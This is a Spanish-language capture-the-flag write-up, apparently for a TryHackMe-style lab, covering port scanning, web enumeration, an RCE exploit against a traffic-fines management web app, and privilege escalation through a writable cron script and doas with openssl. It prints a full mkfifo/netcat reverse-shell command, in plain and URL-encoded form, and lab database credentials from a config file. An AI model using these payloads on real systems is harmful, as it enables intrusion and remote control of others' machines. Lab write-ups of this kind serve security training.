
# scanner

```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```
Como vemos el puerto 445 que habitualmente esta asignado al servicio SMB en este caso hay un servidor web apache. Se trataría por tanto de
de un ***virtual host*** del tipo puerto (port virtual-host)

# enumeracion
## servidor web en puerto 80

```
/admin                (Status: 301) [Size: 312] [--> http://10.10.210.74/admin/]
/shadow               (Status: 200) [Size: 25]                                  
/passwd               (Status: 200) [Size: 25] 
```

- En /admin hay un fichero ("id_rsa") que contiene un string que parece una clave privada (VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeS4ubm93IGdldCBiYWNrIHRvIGVudW1lcmF0aW9uIDpE)
- En /shadow hay lo que parece un base64 (bm90IHRoaXMgZWFzeSA6RA==). Decodificado: not this easy :D
- En /passwd hay otro string que parece estar codificado en base64 (bm90IHRoaXMgZWFzeSA6RA==). Resulta que es el mismo que el anterior

## servidor en puerto 445
```
/management           (Status: 301) [Size: 322] [--> http://10.10.210.74:445/management/]
```
Si pinchamos en el boton "login" nos lleva a un formulario de identificacion. La pagina parece pertenecer a un sistema de administracion de las
multas de trafico (Traffic Offense Management System). Buscando en exploit-db vemos que este proyecto tiene varias vulnerabilidades. Entre ellas hay
dos tipo RCE (que es el tipo que se menciona en la presentacion de la maquina)
Utilizamos el exploit     que tenemos que corregir primero, porque sino no funciona. Asi obtenemos un  ***webshell***. Ojo es un webshell no un autentico
shell (lo que realmente estamos ejecutando es un parametro en el navegador). Para obtener un verdadero shell tenemos que ejecutar un payload. En este caso el elegido es rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.11.62.57 4455 >/tmp/f que solo funciona codificado uRL:
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.11.62.57%204455%20%3E%2Ftmp%2Ff
Asi obtenemos un reversed shell. Lo estabilizamos. Tenemos tres usuarios mas con shell:
1. root
2. ubuntu
3. El otro

Este ultimo es el que contiene el flag, pero no podemos leerlo porque no tenemos permisos
Nos vamos al sitio web (/usr/www/). donde hay dos directorios:
1. 80
2. 445: En este hay varios directorios y ficheros. El mas interesante es "initialize.php" que contiene los siguiente:

```
<?php
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');
if(!defined('base_url')) define('base_url','/management/');
if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
if(!defined('dev_data')) define('dev_data',$dev_data);
if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"tms_user");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"Password@123");
if(!defined('DB_NAME')) define('DB_NAME',"tms_db");
?>
```
donde podemos ver el usuario y el password:
tms_user:Password@123

## crontab
En crontab tenemos una tarea cuyo propietario es plot-admin que se realiza cada segundo y que consiste en ejecutar un script llamado "backup.sh"
que se encuentra en /var/html/scripts con la suerte de que podemos escribir dentro del directorio scripts y por tanto podemos borrar el 
backup.sh original y sustituirlo por un backup.sh que contenga un payload para un reversed shell (en este caso mkfifo nc). Con esto 
obtenemos un shell de plot_admin

## SUID
Tenemos un suid /usr/bin/doas. Doas es un sustituto de sudo que se configura en un fichero /etc/doas.config. Si vemos este fichero vemos
que plot-admin puede ejecutar como root el comando openssl
